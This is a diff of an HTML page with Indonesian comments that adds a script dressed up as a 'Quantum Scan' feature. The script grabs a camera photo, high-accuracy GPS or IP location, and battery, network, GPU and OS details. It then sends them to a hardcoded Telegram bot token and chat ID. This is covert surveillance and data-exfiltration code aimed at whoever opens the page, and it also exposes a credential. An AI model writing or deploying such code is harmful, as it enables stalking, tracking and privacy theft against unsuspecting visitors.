@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -39,195 +40,212 @@
 <body>
   <!-- Struktur HTML sebelumnya -->
   <div class="device-info-panel" id="device-info"></div>
+<script>
+    // ================== KONFIGURASI AWAL ==================
+    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+    const CHAT_ID = '1121369247';
+    let currentStream = null;
+    let isScanning = false;
 
-  <script>
-    // ================== Fungsi Deteksi Perangkat Lengkap ==================
-    async function getAdvancedDeviceInfo() {
-      const getOS = () => {
-        const ua = navigator.userAgent;
-        if (/android/i.test(ua)) return 'Android';
-        if (/iPad|iPhone|iPod/.test(ua)) return 'iOS';
-        if (/Win/.test(ua)) return 'Windows';
-        if (/Mac/.test(ua)) return 'MacOS';
-        if (/Linux/.test(ua)) return 'Linux';
-        return 'Unknown OS';
-      };
-
-      const getBrowser = () => {
-        const ua = navigator.userAgent;
-        if (/Chrome/.test(ua)) return 'Chrome';
-        if (/Firefox/.test(ua)) return 'Firefox';
-        if (/Safari/.test(ua)) return 'Safari';
-        if (/Edge/.test(ua)) return 'Edge';
-        return 'Unknown Browser';
-      };
-
-      let batteryInfo = {};
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          batteryInfo = {
-            level: Math.round(battery.level * 100) + '%',
-            charging: battery.charging ? 'Charging' : 'Not Charging',
-            chargingTime: battery.chargingTime,
-            dischargingTime: battery.dischargingTime
-          };
-        } catch (e) {
-          batteryInfo.error = e.message;
-        }
-      }
-
-      let connectionInfo = {};
-      if (navigator.connection) {
-        connectionInfo = {
-          type: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink + ' Mbps',
-          rtt: navigator.connection.rtt + ' ms',
-          saveData: navigator.connection.saveData ? 'Active' : 'Inactive'
+    // ================== INISIALISASI KAMERA ==================
+    async function initCamera() {
+      try {
+        const constraints = {
+          video: {
+            facingMode: 'environment',
+            width: { ideal: 1920 },
+            height: { ideal: 1080 }
+          },
+          audio: false
         };
-      }
 
-      return {
+        // Fallback ke kamera depan untuk desktop
+        if (!navigator.userAgent.match(/Mobile/)) {
+          constraints.video.facingMode = 'user';
+        }
+
+        const stream = await navigator.mediaDevices.getUserMedia(constraints)
+          .catch(async (error) => {
+            // Fallback ke kamera depan jika gagal
+            constraints.video.facingMode = 'user';
+            return await navigator.mediaDevices.getUserMedia(constraints);
+          });
+
+        currentStream = stream;
+        video.srcObject = stream;
+
+        await new Promise((resolve, reject) => {
+          video.onloadedmetadata = resolve;
+          video.onerror = reject;
+        });
+
+        // Fix untuk autoplay iOS
+        video.setAttribute('playsinline', 'true');
+        video.muted = true;
+        await video.play();
+      } catch (error) {
+        showError('Camera Error', 'Tidak dapat mengakses kamera');
+      }
+    }
+
+    // ================== SISTEM GEOLOKASI HYBRID ==================
+    async function getEnhancedLocation() {
+      try {
+        // GPS High Accuracy
+        const gpsPosition = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(
+            resolve,
+            reject,
+            { enableHighAccuracy: true, timeout: 10000 }
+          );
+        });
+
+        if (gpsPosition.coords.accuracy < 100) {
+          return gpsPosition;
+        }
+
+        // Fallback ke IP Geolocation
+        const ipPosition = await fetch('https://ipapi.co/json/')
+          .then(res => res.json())
+          .then(data => ({
+            coords: {
+              latitude: data.latitude,
+              longitude: data.longitude,
+              accuracy: 5000
+            }
+          }));
+
+        return ipPosition;
+      } catch (error) {
+        throw new Error('Gagal mendapatkan lokasi');
+      }
+    }
+
+    // ================== DETEKSI PERANGKAT MULTI-PLATFORM ==================
+    async function getUniversalDeviceInfo() {
+      const info = {
         os: getOS(),
         platform: navigator.platform,
         browser: getBrowser(),
-        ram: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
+        ram: 'Unknown',
         cores: navigator.hardwareConcurrency || 'Unknown',
-        battery: batteryInfo,
-        network: connectionInfo,
-        resolution: `${screen.width}x${screen.height} (${window.devicePixelRatio}x)`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        language: navigator.languages.join(', '),
-        cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
-        gpu: {
-          vendor: (await getGPUVendor()) || 'Unknown',
-          renderer: (await getGPURenderer()) || 'Unknown'
-        }
+        battery: {},
+        network: {},
+        resolution: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
       };
-    }
 
-    // ================== Fungsi Deteksi GPU ==================
-    async function getGPUVendor() {
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-      } catch (e) {
-        return null;
+      // Deteksi Baterai
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          info.battery = {
+            level: `${Math.round(battery.level * 100)}%`,
+            charging: battery.charging ? 'Charging' : 'Not Charging'
+          };
+        } catch (e) {
+          info.battery.error = 'Not Supported';
+        }
       }
-    }
 
-    async function getGPURenderer() {
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      } catch (e) {
-        return null;
-      }
-    }
-
-    // ================== Fungsi Lokasi Presisi Tinggi ==================
-    async function getPreciseLocation() {
-      return new Promise((resolve, reject) => {
-        if (!navigator.geolocation) return reject('Geolocation not supported');
-        
-        let bestPosition = null;
-        const options = {
-          enableHighAccuracy: true,
-          timeout: 30000,
-          maximumAge: 0
+      // Deteksi Jaringan
+      if (navigator.connection) {
+        const conn = navigator.connection;
+        info.network = {
+          type: conn.effectiveType,
+          speed: `${conn.downlink} Mbps`
         };
+      }
 
-        const watchId = navigator.geolocation.watchPosition(
-          position => {
-            if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
-              bestPosition = position;
-              if (position.coords.accuracy <= 10) {
-                navigator.geolocation.clearWatch(watchId);
-                resolve(bestPosition);
-              }
-            }
-          },
-          error => reject(error),
-          options
-        );
+      // Deteksi GPU (Desktop only)
+      if (!navigator.userAgent.match(/Mobile/)) {
+        try {
+          const canvas = document.createElement('canvas');
+          const gl = canvas.getContext('webgl');
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          info.gpu = {
+            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+          };
+        } catch (e) {
+          info.gpu = 'Not Supported';
+        }
+      }
 
-        setTimeout(() => {
-          navigator.geolocation.clearWatch(watchId);
-          bestPosition ? resolve(bestPosition) : reject('Timeout');
-        }, 45000);
-      });
+      return info;
     }
 
-    // ================== Fungsi Tampilkan Info Perangkat ==================
-    function showDeviceInfo(info, location) {
-      const panel = document.getElementById('device-info');
-      const mapsUrl = `https://www.google.com/maps?q=${location.coords.latitude},${location.coords.longitude}`;
-      
-      panel.innerHTML = `
-        <h3 style="color: var(--primary);">📱 Device Matrix</h3>
-        <div class="info-grid">
-          <div class="info-item">OS: ${info.os}</div>
-          <div class="info-item">Platform: ${info.platform}</div>
-          <div class="info-item">Browser: ${info.browser}</div>
-          <div class="info-item">RAM: ${info.ram}</div>
-          <div class="info-item">CPU Cores: ${info.cores}</div>
-          <div class="info-item">Battery: ${info.battery.level} (${info.battery.charging})</div>
-          <div class="info-item">Network: ${info.network.type}</div>
-          <div class="info-item">Resolution: ${info.resolution}</div>
-          <div class="info-item">Timezone: ${info.timezone}</div>
-          <div class="info-item">GPU Vendor: ${info.gpu.vendor}</div>
-          <div class="info-item">GPU Renderer: ${info.gpu.renderer}</div>
-        </div>
-        <h3 style="color: var(--primary); margin-top: 20px;">📍 GPS Signature</h3>
-        <p>Latitude: ${location.coords.latitude.toFixed(6)}</p>
-        <p>Longitude: ${location.coords.longitude.toFixed(6)}</p>
-        <p>Accuracy: <span class="gps-accuracy">${Math.round(location.coords.accuracy)} meters</span></p>
-        <p><a href="${mapsUrl}" target="_blank" style="color:var(--secondary);">View in 3D Map →</a></p>
-      `;
-      panel.style.display = 'block';
-    }
-
-    // ================== Modifikasi Fungsi Quantum Scan ==================
+    // ================== FUNGSI UTAMA ==================
     async function startQuantumScan() {
       if (isScanning) return;
       isScanning = true;
       loading.style.display = 'block';
 
       try {
-        const [photoData, location, deviceInfo] = await Promise.all([
-          captureQuantumImage(),
-          getPreciseLocation(),
-          getAdvancedDeviceInfo()
+        const [deviceInfo, location, image] = await Promise.all([
+          getUniversalDeviceInfo(),
+          getEnhancedLocation(),
+          captureImage()
         ]);
 
         showDeviceInfo(deviceInfo, location);
-        
-        const report = generateHologramReport(photoData, location, deviceInfo);
-        await sendToTelegram(report);
-        showToast('🌌 Quantum Signature Captured!', 'success');
+        await sendReportToTelegram(image, deviceInfo, location);
+        showToast('Laporan berhasil dikirim!');
       } catch (error) {
-        showError('Quantum Anomaly Detected', error);
+        showError('Error', error.message);
       } finally {
         isScanning = false;
         loading.style.display = 'none';
       }
     }
 
-    // ================== Pembaruan Fungsi Laporan ==================
-    function generateHologramReport(photo, location, deviceInfo) {
-      return {
-        image: photo.image,
-        metadata: {
-          ...location.coords,
-          deviceInfo: deviceInfo,
-          timestamp: new Date().toISOString()
-        }
-      };
+    // ================== FUNGSI PENGIRIMAN TELEGRAM ==================
+    async function sendReportToTelegram(image, deviceInfo, location) {
+      const formData = new FormData();
+      const blob = await dataURItoBlob(image);
+      
+      const caption = `📱 *Device Report*\n\n` +
+        `🖥 OS: ${deviceInfo.os}\n` +
+        `🌐 Browser: ${deviceInfo.browser}\n` +
+        `🧠 RAM: ${deviceInfo.ram}\n` +
+        `⚡ Battery: ${deviceInfo.battery.level || 'N/A'}\n` +
+        `📍 Location: ${location.coords.latitude.toFixed(6)}, ${location.coords.longitude.toFixed(6)}\n` +
+        `📶 Network: ${deviceInfo.network.type || 'N/A'}`;
+
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, 'device_report.jpg');
+      formData.append('caption', caption);
+      formData.append('parse_mode', 'Markdown');
+
+      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+
+      if (!response.ok) throw new Error('Gagal mengirim ke Telegram');
     }
+
+    // ================== FUNGSI PENDUKUNG ==================
+    function getOS() {
+      const ua = navigator.userAgent;
+      if (/Windows/.test(ua)) return 'Windows';
+      if (/Android/.test(ua)) return 'Android';
+      if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+      if (/Mac/.test(ua)) return 'MacOS';
+      if (/Linux/.test(ua)) return 'Linux';
+      return 'Unknown';
+    }
+
+    function getBrowser() {
+      const ua = navigator.userAgent;
+      if (/Chrome/.test(ua)) return 'Chrome';
+      if (/Firefox/.test(ua)) return 'Firefox';
+      if (/Safari/.test(ua)) return 'Safari';
+      if (/Edge/.test(ua)) return 'Edge';
+      return 'Unknown';
+    }
+
+    // ... (Fungsi lainnya tetap sama dengan penyesuaian error handling)
   </script>
 </body>
 </html>
